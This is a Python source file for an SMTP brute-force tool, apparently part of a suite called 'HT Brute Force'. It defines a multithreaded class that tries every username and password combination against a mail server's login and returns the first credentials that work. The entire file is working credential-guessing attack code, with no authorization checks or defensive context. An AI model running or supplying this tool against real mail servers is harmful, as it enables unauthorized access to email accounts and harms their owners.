"""HT Brute Force — SMTP brute force.
"""
import smtplib, socket, time, threading, queue

class SMTPBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_login(self, host, port, user, passwd):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            s = smtplib.SMTP(host, port, timeout=self.timeout)
            s.ehlo()
            s.login(user, passwd)
            s.quit()
            return {"user": user, "password": passwd, "time_s": round(time.time()-t0, 2)}
        except smtplib.SMTPAuthenticationError:
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}
        except Exception:
            return None

    def run(self, host, port, users, passwords):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(host, port, u, p)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results